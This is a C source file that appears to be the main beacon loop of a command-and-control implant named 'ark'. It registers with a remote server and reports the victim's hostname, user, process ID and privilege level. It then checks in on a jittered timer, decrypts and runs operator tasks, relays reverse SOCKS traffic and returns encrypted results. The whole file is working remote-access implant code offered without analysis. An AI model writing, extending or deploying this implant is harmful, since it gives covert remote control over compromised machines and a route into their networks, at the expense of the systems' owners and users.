#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ark/beacon.h"
#include "ark/config.h"
#include "ark/crypto.h"
#include "ark/pb_c2.h"
#include "ark/platform.h"
#include "ark/socks.h"
#include "ark/tasks.h"
#include "ark/transport.h"

#define ARK_MAX_PENDING 32
#define ARK_MAX_SLEEP_MS 86400000

typedef struct ark_state {
    uint8_t           secret[32];
    size_t            secret_len;
    uint8_t           session_key[32];
    int               has_session_key;
    char              session_id[64];
    uint32_t          sleep_ms;
    int               jitter_pct;
    ark_transport *transport;
    ark_task_result pending[ARK_MAX_PENDING];
    size_t            pending_count;
    int64_t           last_beacon_ts;
} ark_state;

static int ark_register(ark_state *st) {
    ark_register_msg msg;
    memset(&msg, 0, sizeof(msg));
    strncpy(msg.implant_id, ARK_IMPLANT_ID, sizeof(msg.implant_id) - 1);
    ark_get_identity(msg.hostname, sizeof(msg.hostname), msg.username, sizeof(msg.username),
        &msg.pid, msg.integrity_level, sizeof(msg.integrity_level));
    strncpy(msg.os, ark_os_name(), sizeof(msg.os) - 1);
    strncpy(msg.arch, ark_arch_name(), sizeof(msg.arch) - 1);
    msg.timestamp = ark_unique_unix_ms(&st->last_beacon_ts);
    if (!ark_hmac_sha256(st->secret, st->secret_len,
            (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
        return 0;
    }
    msg.hmac_len = 32;

    uint8_t *wire = NULL;
    size_t wire_len = 0;
    if (!ark_pb_encode_register(&msg, &wire, &wire_len)) return 0;

    uint8_t *resp = NULL;
    size_t resp_len = 0;
    int ok = ark_transport_register(st->transport, wire, wire_len, &resp, &resp_len);
    free(wire);
    if (!ok) return 0;

    ark_register_resp rr;
    if (!ark_pb_decode_register_resp(resp, resp_len, &rr)) { free(resp); return 0; }
    free(resp);

    if (!rr.success) { ark_pb_free_register_resp(&rr); return 0; }
    strncpy(st->session_id, rr.session_id, sizeof(st->session_id) - 1);
    ark_transport_set_session_id(st->transport, st->session_id);
    if (rr.next_checkin_ms > 0) st->sleep_ms = (uint32_t)rr.next_checkin_ms;

    if (rr.encrypted_session_key_len > 0) {
        uint8_t *key = NULL;
        size_t key_len = 0;
        if (ark_aes_gcm_decrypt(st->secret, rr.encrypted_session_key, rr.encrypted_session_key_len, &key, &key_len) && key_len == 32) {
            memcpy(st->session_key, key, 32);
            st->has_session_key = 1;
        }
        free(key);
    }
    ark_pb_free_register_resp(&rr);
    return 1;
}

static ark_beacon_resp *ark_send_beacon(ark_state *st) {
    ark_beacon_msg msg;
    memset(&msg, 0, sizeof(msg));
    strncpy(msg.implant_id, ARK_IMPLANT_ID, sizeof(msg.implant_id) - 1);
    strncpy(msg.session_id, st->session_id, sizeof(msg.session_id) - 1);
    msg.timestamp = ark_unique_unix_ms(&st->last_beacon_ts);
    if (!ark_hmac_sha256(st->secret, st->secret_len,
            (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
        return NULL;
    }
    msg.hmac_len = 32;

    ark_socks_frame *socks = NULL;
    size_t socks_n = 0;
    if (st->has_session_key)
        ark_socks_drain(&socks, &socks_n);
    if (st->has_session_key && (st->pending_count > 0 || socks_n > 0)) {
        uint8_t *payload = NULL;
        size_t payload_len = 0;
        if (ark_pb_encode_results_payload(st->pending, st->pending_count,
                socks, socks_n, &payload, &payload_len)) {
            if (!ark_aes_gcm_encrypt(st->session_key, payload, payload_len,
                    &msg.encrypted_results, &msg.encrypted_results_len)) {
                free(payload);
                ark_socks_requeue(socks, socks_n);
                return NULL;
            }
            free(payload);
            /* Keep socks until transport succeeds so we can requeue on failure. */
        } else {
            ark_socks_requeue(socks, socks_n);
            socks = NULL;
            socks_n = 0;
        }
    }

    uint8_t *wire = NULL;
    size_t wire_len = 0;
    if (!ark_pb_encode_beacon(&msg, &wire, &wire_len)) {
        free(msg.encrypted_results);
        if (socks) ark_socks_requeue(socks, socks_n);
        return NULL;
    }
    free(msg.encrypted_results);

    uint8_t *resp = NULL;
    size_t resp_len = 0;
    if (!ark_transport_beacon(st->transport, wire, wire_len, &resp, &resp_len)) {
        free(wire);
        if (socks) ark_socks_requeue(socks, socks_n);
        return NULL;
    }
    free(wire);
    if (socks)
        ark_socks_frames_free(socks, socks_n);

    ark_beacon_resp *br = (ark_beacon_resp *)calloc(1, sizeof(*br));
    if (!br) { free(resp); return NULL; }
    if (!ark_pb_decode_beacon_resp(resp, resp_len, br)) {
        free(resp);
        free(br);
        return NULL;
    }
    free(resp);
    return br;
}

static void ark_free_result(ark_task_result *r) {
    free(r->data);
    r->data = NULL;
    r->data_len = 0;
}

int ark_beacon_run(void) {
    if (!ark_platform_init()) return 1;

    ark_state st;
    memset(&st, 0, sizeof(st));
    st.sleep_ms = ARK_SLEEP_MS > 0 ? (uint32_t)ARK_SLEEP_MS : 5000;
    st.jitter_pct = ARK_JITTER_PCT;

    if (!ark_hex_decode(ARK_IMPLANT_SECRET, st.secret, sizeof(st.secret), &st.secret_len) || st.secret_len != 32) {
        fprintf(stderr, "ark: invalid IMPLANT_SECRET (need 32-byte hex)\n");
        return 1;
    }

    const char *tt = ARK_TRANSPORT_TYPE[0] ? ARK_TRANSPORT_TYPE : "https";
    if (strcmp(tt, "https") == 0 && ARK_CA_CERT_PEM[0] == '\0') {
        fprintf(stderr, "ark: HTTPS requires CA pin (CA_CERT_PATH=.../ca-cert.pem at build)\n");
        return 1;
    }
    if (!ark_transport_create(tt, &st.transport)) {
        fprintf(stderr, "ark: transport create failed (type=%s; check CA pin / libs)\n", tt);
        return 1;
    }

    for (int i = 0; i < 10 && !st.session_id[0]; i++) {
        if (ark_register(&st)) break;
        ark_sleep_ms(ark_jitter_ms(st.sleep_ms * (uint32_t)(i + 1), st.jitter_pct));
    }
    if (!st.session_id[0]) {
        fprintf(stderr, "ark: register failed after retries (callback/CA/HMAC/skew)\n");
        ark_transport_destroy(st.transport);
        return 1;
    }

    for (;;) {
        /* Reverse SOCKS needs faster poll when active (match Go implant). */
        uint32_t sleep_ms = st.sleep_ms;
        if (ark_socks_active() && sleep_ms > 200)
            sleep_ms = 200;
        ark_sleep_ms(ark_jitter_ms(sleep_ms, st.jitter_pct));

        ark_beacon_resp *resp = ark_send_beacon(&st);
        if (!resp) continue;

        st.pending_count = 0;

        if (resp->terminate) {
            ark_pb_free_beacon_resp(resp);
            ark_socks_shutdown();
            break;
        }
        if (resp->next_checkin_ms > 0)
            st.sleep_ms = (uint32_t)resp->next_checkin_ms;

        /*
         * Task source (match Go implant decryptTasks):
         * - No session key yet: allow plaintext tasks (pre-crypto path).
         * - Session key set: ONLY encrypted_tasks; ignore plaintext field.
         *   Empty/invalid/failed decrypt → execute nothing (fail closed).
         */
        ark_task *tasks = NULL;
        size_t task_count = 0;
        ark_socks_frame *in_socks = NULL;
        size_t in_socks_n = 0;
        int own_tasks = 0;

        if (st.has_session_key) {
            if (resp->encrypted_tasks_len > 0) {
                uint8_t *plain = NULL;
                size_t plain_len = 0;
                if (ark_aes_gcm_decrypt(st.session_key, resp->encrypted_tasks,
                        resp->encrypted_tasks_len, &plain, &plain_len)) {
                    ark_task *decoded = NULL;
                    size_t decoded_count = 0;
                    if (ark_pb_decode_tasks_payload(plain, plain_len, &decoded, &decoded_count,
                            &in_socks, &in_socks_n)) {
                        tasks = decoded;
                        task_count = decoded_count;
                        own_tasks = 1;
                    }
                    free(plain);
                }
            }
            /* Drop any plaintext tasks so free_beacon_resp does not re-execute paths. */
            ark_pb_free_tasks(resp->tasks, resp->task_count);
            resp->tasks = NULL;
            resp->task_count = 0;
        } else {
            tasks = resp->tasks;
            task_count = resp->task_count;
        }

        if (in_socks_n > 0)
            ark_socks_handle(in_socks, in_socks_n);
        ark_socks_frames_free(in_socks, in_socks_n);
        in_socks = NULL;
        in_socks_n = 0;

        for (size_t i = 0; i < task_count; i++) {
            if (tasks[i].task_type == ARK_TASK_EXIT) {
                if (own_tasks)
                    ark_pb_free_tasks(tasks, task_count);
                ark_pb_free_beacon_resp(resp);
                ark_socks_shutdown();
                for (size_t j = 0; j < st.pending_count; j++)
                    ark_free_result(&st.pending[j]);
                st.pending_count = 0;
                ark_transport_destroy(st.transport);
                return 0;
            }
            if (tasks[i].task_type == ARK_TASK_SLEEP) {
                ark_sleep_task sl;
                if (ark_pb_decode_sleep_task(tasks[i].data, tasks[i].data_len, &sl)) {
                    if (sl.sleep_ms > 0 && sl.sleep_ms <= ARK_MAX_SLEEP_MS)
                        st.sleep_ms = (uint32_t)sl.sleep_ms;
                    if (sl.jitter_pct > 0 && sl.jitter_pct <= 100)
                        st.jitter_pct = sl.jitter_pct;
                }
                if (st.pending_count < ARK_MAX_PENDING) {
                    ark_task_result ok = {0};
                    strncpy(ok.task_id, tasks[i].task_id, sizeof(ok.task_id) - 1);
                    ok.success = 1;
                    st.pending[st.pending_count++] = ok;
                }
                continue;
            }

            ark_task_result tr = ark_execute_task(&tasks[i]);
            if (st.pending_count < ARK_MAX_PENDING) {
                st.pending[st.pending_count] = tr;
                st.pending_count++;
            } else {
                ark_free_result(&tr);
            }
        }

        if (own_tasks)
            ark_pb_free_tasks(tasks, task_count);
        ark_pb_free_beacon_resp(resp);
    }

    for (size_t i = 0; i < st.pending_count; i++)
        ark_free_result(&st.pending[i]);
    ark_transport_destroy(st.transport);
    return 0;
}